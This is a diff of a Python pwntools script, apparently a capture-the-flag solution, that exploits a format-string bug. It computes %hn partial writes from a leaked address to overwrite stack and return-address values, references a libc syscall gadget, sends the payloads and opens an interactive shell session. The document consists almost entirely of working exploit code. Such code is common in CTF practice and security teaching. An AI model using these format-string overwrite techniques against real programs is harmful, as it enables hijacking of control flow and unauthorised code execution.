@@ -83,22 +83,56 @@ leak = p.recvuntil("begin", drop = True).strip().decode()
 
 leak = int(leak, 16)
 
-buf = leak + 0x2c50
+buf = leak + 0x2c55
 print(hex(leak))
 
 
-
+written = 0
 rsp = rip - 0x20
 bytes_to_write = rsp & 0xffff
 print(hex(bytes_to_write))
 payload = f"%{bytes_to_write-8}c%c%c%c%c%c%c%c%c%hn".encode()
 
-bytes_to_write = 0x10000 - bytes_to_write + 0x140b + 5
+written += bytes_to_write
+
+bytes_to_write = 0x10000 - written + 0x140b + 5
 pos = int(0x138 / 8 + 6)
-payload += f"%{bytes_to_write}c%{pos}$hn-".encode()
+payload += f"%{bytes_to_write}c%{pos}$hn".encode()
+written += bytes_to_write
 
 
+future_rbp = rip + 8 - 0x20 - 0x20 # may need to adjust here
+bytes_to_write = future_rbp & 0xffff
 
+print(hex(bytes_to_write))
+
+
+if written % 0x10000 < bytes_to_write:
+	bytes_to_write = bytes_to_write - (written % 0x10000)
+else:
+	bytes_to_write = 0x10000 - (written % 0x10000) + bytes_to_write
+	
+
+
+payload += f"%{bytes_to_write-4}c%c%c%c%c%hn".encode()
+written += bytes_to_write
+
+'''
+bytes_to_write = buf & 0xffff
+print(hex(bytes_to_write))
+
+
+if written % 0x10000 < bytes_to_write:
+	bytes_to_write = bytes_to_write - (written % 0x10000)
+else:
+	bytes_to_write = 0x10000 - (written % 0x10000) + bytes_to_write
+
+pos = int(0x138 / 8 + 6)
+#payload += f"%{bytes_to_write}c%{pos}$hn".encode()
+print(len(payload))
+
+gdb.attach(p, s)
+'''
 p.sendline(payload)
 
 
@@ -129,28 +163,42 @@ syscall = libc_base + 0x000000000002284d
 
 
 
-
+written = 0
+bytes_to_write = buf & 0xffff# buf is 0x55bff95c140b
+pos = int(0x158 / 8 + 6)
+print(hex(bytes_to_write))
+payload = f"%{bytes_to_write}c%{pos}$hn".encode()
+written += bytes_to_write
 
 rsp = rip - 0x40
 bytes_to_write = rsp & 0xffff
 print(hex(bytes_to_write))
-payload = f"%{bytes_to_write-12}c%c%c%c%c%c%c%c%c%c%c%c%c%hn".encode()
 
-bytes_to_write = 0x10000 - bytes_to_write + 0x140b + 5
+if written % 0x10000 < bytes_to_write:
+	bytes_to_write = bytes_to_write - (written % 0x10000)
+else:
+	bytes_to_write = 0x10000 - (written % 0x10000) + bytes_to_write
+	
+payload += f"%{bytes_to_write-11}c%c%c%c%c%c%c%c%c%c%c%c%hn".encode()
+written += bytes_to_write
+
+bytes_to_write = 0x140b + 5
 pos = int(0x158 / 8 + 6)
+
+if written % 0x10000 < bytes_to_write:
+	bytes_to_write = bytes_to_write - (written % 0x10000)
+else:
+	bytes_to_write = 0x10000 - (written % 0x10000) + bytes_to_write
+	
+	
 payload += f"%{bytes_to_write}c%{pos}$hn".encode()
 
 
-rsp = rip - 0x38
-bytes_to_write = rsp & 0xffff
-payload += f"%{bytes_to_write-12}c%c%c%c%c%c%c%c%c%c%c%c%c%hn".encode()
+
 
 print(len(payload))
 gdb.attach(p, s)
 p.sendline(payload)
 p.interactive()
 
-'''
-payload = f"%{bytes_to_write-35}c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%hn".encode()
-
-'''                
+               
